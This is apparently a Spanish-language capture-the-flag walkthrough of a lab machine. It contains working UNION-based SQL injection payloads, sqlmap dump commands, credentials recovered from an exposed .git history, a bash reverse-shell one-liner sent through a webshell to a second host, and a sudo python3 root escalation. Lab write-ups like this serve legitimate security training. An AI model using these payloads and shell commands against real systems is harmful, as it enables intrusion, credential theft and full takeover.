PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Hacemos Fuzzing y encontramos un directorio .git, lo descargamos entero con el siguiente comando, y analizamos su contenido:
	-wget --recursive http://192.168.236.140/.git/

-Entramos a la carpeta que nos genera y ejecutamos el siguiente comando para listar los commits que se han hecho en el proyecto:
	-git log:
		**commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4** (HEAD -> master)
		Author: Jehad Alqurashi <anmar-v7@hotmail.com>
		    i changed login.php file for more secure
		**commit a4d900a8d85e8938d3601f3cef113ee293028e10**
		Author: Jehad Alqurashi <anmar-v7@hotmail.com>
		    I added login.php file with default credentials
		**commit aa2a5f3aa15bb402f2b90a07d86af57436d64917**
		Author: Jehad Alqurashi <anmar-v7@hotmail.com>
		    First Initialize

-Observamos que en el Commit 'a4d900...' se han incluido credenciales por defecto

-Listamos el contenido del Commit 'a4d900...':
	-git show a4d900a8d85e8938d3601f3cef113ee293028e10
		if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321")

-Nos vamos a /login.php e introducimos la credenciales obtenidas:
	-Mail: lush@admin.com
	-Password: 321
		-Estamos dentro!!

-Dentro nos encontramos una URL con la siguiente estructura:
	-http://192.168.236.140/dashboard.php?id=1
	(Tiene pinta de ser vulnerable a SQLI)

## Explotación SQLI 

### Manual

-Si ponemos un 'id' diferente a '1', los campos del perfil cambian y se quedan vacíos

-Hacemos lo siguiente para comprobar cuántas columnas hay:
	-http://192.168.236.140/dashboard.php?id=1 'union select 1,2,3,4,5,6-- -
		(Con '6', sale el contenido de la web, con más o menos sale la web en blanco)
		Por eso sabemos que la Tabla de la BD en uso tiene 6 columnas

-Si cambiamos el valor del 'id' a un numero distinto de '1' o a 'NULL', vemos los números 2,3,5 y 6 en los datos de nuestro perfil, esto es un claro indicativo de que podemos inyectar un comando SQL y saldrá el Output por ahí:
	-http://192.168.236.140/dashboard.php?id=NULL 'union select 1,@@version,3,4,5,6-- -
		**8.0.26-0ubuntu0.20.04.2**
		**(FUNCIONA!!)**

-Para enumerar todas las **BD existentes**:
	-http://192.168.236.140/dashboard.php?id=3 'union select 1,schema_name,3,4,5,6 from information_schema.schemata limit 0,1-- -
		**1-mysql**
	-http://192.168.236.140/dashboard.php?id=3 'union select 1,schema_name,3,4,5,6 from information_schema.schemata limit 1,1-- -
		**2-information_schema**
	-http://192.168.236.140/dashboard.php?id=3 'union select 1,schema_name,3,4,5,6 from information_schema.schemata limit 4,1-- -
		**5-darkhole_2**

**-NOTA:** También se puede hacer directamente con **GROUP_CONCAT**:
	-http://192.168.236.140/dashboard.php?id=3 'union select 1,GROUP_CONCAT(schema_name),3,4,5,6 from information_schema.schemata-- -
		**mysql,information_schema,performance_schema,sys,darkhole_2**

-Listamos todas las **Tablas** de la BD **'darkhole_2'**:
	-http://192.168.236.140/dashboard.php?id=3 'union select 1,GROUP_CONCAT(table_name),3,4,5,6 from information_schema.tables where table_schema='darkhole_2'-- 
		**ssh, users**

-NOTA: Con **limit** sería así:
	-http://192.168.236.140/dashboard.php?id=3 'union select 1,table_name,3,4,5,6 from information_schema.tables where table_schema='darkhole_2' limit 0,1-- -
		**ssh**
	-http://192.168.236.140/dashboard.php?id=3 'union select 1,table_name,3,4,5,6 from information_schema.tables where table_schema='darkhole_2' limit 1,1-- -
		**users**

-Listamos las **Columnas** de la **Tabla 'SSH'**:
	-http://192.168.236.140/dashboard.php?id=3 'union select 1,GROUP_CONCAT(column_name),3,4,5,6 from information_schema.columns where table_name='ssh'-- -
		**id,user,pass**

-Listamos el **Contenido** de las **Columnas** **'User'** y **'PASS'**:
	-http://192.168.236.140/dashboard.php?id=3 'union select 1,user,pass,4,5,6 from darkhole_2.ssh-- -
		-User: jehad
		-Pass: fool

-NOTA: También se puede listar el Contenido de los Campos con GROUP_CONCAT, aunque lo lista todo junto en la misma columna:
	-http://192.168.236.140/dashboard.php?id=2' union select 1,GROUP_CONCAT(user,pass),3,4,5,6 from darkhole_2.ssh-- -
		jehadfool

**-NOTA:** También se puede terminando con:
	-from ssh-- -
### Con SQLMAP

-**Listamos las Bases de Datos** con el siguiente comando (importante incluir la Cookie de sesión):
	-sqlmap -u "http://192.168.236.140/dashboard.php?id=1" --cookie "PHPSESSID=5301uppcs54rp2a4fip67uoa9h" --dbs --batch
		[*] darkhole_2
		[*] information_schema
		[*] mysql
		[*] performance_schema
		[*] sys

-Listamos las Tablas existentes en la BD 'darkhole_2':
	-sqlmap -u "http://192.168.236.140/dashboard.php?id=1" --cookie "PHPSESSID=5301uppcs54rp2a4fip67uoa9h" -D darkhole_2 --tables --batch
		[2 tables]
		+-------+
		| ssh   |
		| users |
		+-------+

-Listamos el Contenido de la Tabla 'ssh':
	-sqlmap -u "http://192.168.236.140/dashboard.php?id=1" --cookie "PHPSESSID=5301uppcs54rp2a4fip67uoa9h" -D darkhole_2 -T ssh --dump --batch
		+----+------+--------+
		| id | pass | user   |
		+----+------+--------+
		| 1  | fool | jehad  |
		+----+------+--------+

-NOTA: Podemos listar todo el Contenido de la BD directamente con:
	-sqlmap -u "http://192.168.236.140/dashboard.php?id=1" --cookie "PHPSESSID=5301uppcs54rp2a4fip67uoa9h" -D darkhole_2 --dump --batch


-Nos autenticamos en SSH con las credenciales obtenidas de la Tabla SSH:
	-ssh jehad@192.168.236.140
	-Password: fool
		**jehad@darkhole:~$ whoami**
			**jehad**

## Escalada de Privilegios

-Nos vamos a /home/jehad/.bash_history y vemos que hay logs de alguien ejecutando comandos a través de una webshell en el puerto 9999
#### User Pivoting

-Hacemos **'ss -tan'** y vemos que el puerto 9999 está abierto en localhost, hacemos **Local Port Forwarding**:
	-ssh jehad@192.168.236.140 -L 9999:localhost:9999
	-Password: fool

-Listamos el contenido del puerto 9999 desde la URL y tenemos una webshell como el usuario 'losy', nos mandamos una RS y Pivotamos de Usuario:
	-http://localhost:9999/?cmd=bash -c 'bash -i >& /dev/tcp/192.168.236.128/1234 0>&1'
		**losy@darkhole:/opt/web$ whoami**
			**losy**

-cat /home/losy/.bash_history
	P0assw0rd losy:gang

-sudo -l
-Password: gang
	 (root) /usr/bin/python3

sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
	root@darkhole:/home/losy# whoami
		root